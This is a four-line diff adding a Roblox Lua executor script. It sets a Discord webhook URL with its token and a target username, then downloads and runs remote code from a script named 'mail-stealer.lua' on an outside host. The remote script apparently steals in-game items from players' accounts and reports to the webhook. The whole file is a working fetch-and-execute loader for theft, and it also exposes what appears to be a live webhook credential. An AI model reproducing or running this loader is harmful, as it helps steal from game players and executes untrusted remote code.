@@ -1,0 +1,4 @@
+getgenv().webhook = "https://discord.com/api/webhooks/1111240000433033286/pB9Mz80o7MPX9zcgO7t2Op0X5R_etqUg-YG_7HlbCL-HLiasbY8YlsP81Hf5gqMqPrYP"
+getgenv().name = "AFKvip_proplayer"
+getgenv().mouselock = true
+loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
